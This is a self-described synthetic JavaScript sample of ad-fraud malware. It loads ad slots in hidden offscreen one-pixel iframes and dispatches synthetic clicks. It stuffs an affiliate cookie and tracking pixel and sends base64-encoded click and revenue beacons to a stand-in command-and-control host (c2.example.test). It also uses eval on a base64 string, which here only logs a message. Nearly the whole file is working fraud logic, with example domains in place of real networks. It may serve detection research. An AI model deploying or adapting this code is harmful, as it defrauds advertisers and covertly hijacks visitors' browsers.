// Ad-fraud click injection: hidden ad frames, synthetic clicks, cookie stuffing
// and revenue beacons. Synthetic sample; no real ad network is contacted.
(function () {
  var C2 = 'https://c2.example.test/adfraud';
  var SLOTS = [
    'https://ads.example.net/slot/a',
    'https://ads.example.net/slot/b',
    'https://ads.example.net/slot/c'
  ];
  eval(atob('Y29uc29sZS5sb2coJ1tBREZSQVVELSBjbGljayBpbmplY3Rpb24gbW9kdWxlIHJlYWR5Jyk7'));
  var clicks = 0;
  var revenue = 0;
  var campaign = 'cmp-' + Math.floor(Math.random() * 1e6).toString(36);
  var queue = [];
  console.log('[ADFRAUD] injector online', SLOTS.length, campaign);

  function persist(state) {
    try {
      queue.push({ at: Date.now(), state: state });
      if (queue.length > 32) queue.shift();
      localStorage.setItem('adfraud:queue', JSON.stringify(queue));
      localStorage.setItem('adfraud:revenue', String(revenue.toFixed(4)));
    } catch (error) {}
  }

  function flush() {
    if (queue.length === 0) return;
    var batch = queue.splice(0, queue.length);
    try {
      fetch(C2 + '/batch', { method: 'POST', body: btoa(JSON.stringify({ campaign: campaign, batch: batch })) }).catch(function () {});
    } catch (error) {}
  }

  function visible() {
    try {
      return document.visibilityState !== 'hidden' && document.hasFocus();
    } catch (error) {
      return true;
    }
  }

  function makeFrame(index) {
    try {
      var frame = document.createElement('iframe');
      frame.src = SLOTS[index % SLOTS.length] + '?slot=' + index + '&rand=' + Math.floor(Math.random() * 1e6);
      frame.width = '1';
      frame.height = '1';
      frame.style.position = 'absolute';
      frame.style.left = '-9999px';
      frame.style.opacity = '0';
      document.body.appendChild(frame);
      return frame;
    } catch (error) {
      return null;
    }
  }

  function simulateClick(index) {
    clicks += 1;
    revenue += 0.02 + (index % 3) * 0.01;
    var coordinates = { x: (index * 37) % 320, y: (index * 53) % 240 };
    if (!visible()) {
      persist({ deferred: index, coordinates: coordinates });
      return;
    }
    try {
      var event = new Event('click', { bubbles: true, cancelable: true });
      var target = document.elementFromPoint ? document.elementFromPoint(index % 100, index % 80) : null;
      if (target && target.dispatchEvent) target.dispatchEvent(event);
    } catch (error) {}
    try { history.replaceState({ ad: index }, '', location.pathname + '?cid=' + index); } catch (error) {}
    try { localStorage.setItem('adfraud:clicks', String(clicks)); } catch (error) {}
    try {
      fetch(C2, { method: 'POST', body: btoa(JSON.stringify({ clicks: clicks, revenue: revenue, slot: index, coordinates: coordinates, campaign: campaign })) }).catch(function () {});
    } catch (error) {}
    persist({ clicks: clicks, slot: index });
    console.log('[ADFRAUD] click', clicks, 'revenue', revenue.toFixed(2), coordinates.x, coordinates.y);
  }

  try {
    var stuffing = document.createElement('img');
    stuffing.src = 'https://affiliate.example.net/track?ref=ADFRAUD-4F19&cb=' + Date.now();
    document.body.appendChild(stuffing);
  } catch (error) {}
  try { document.cookie = 'affiliate=ADFRAUD-4F19; path=/; max-age=86400'; } catch (error) {}

  var index = 0;
  var timer = setInterval(function () {
    makeFrame(index);
    simulateClick(index);
    if (index % 2 === 0) flush();
    index += 1;
    if (index >= 6) {
      clearInterval(timer);
      flush();
      try { localStorage.setItem('adfraud:final', String(revenue.toFixed(4))); } catch (error) {}
    }
  }, 180);
  setTimeout(function () {
    try {
      var frames = document.querySelectorAll('iframe');
      for (var frameIndex = 0; frameIndex < frames.length; frameIndex += 1) {
        if (frames[frameIndex].style.opacity === '0') frames[frameIndex].style.opacity = '0';
      }
      console.log('[ADFRAUD] frames', frames.length, 'queued', queue.length);
    } catch (error) {}
  }, 1200);
})();
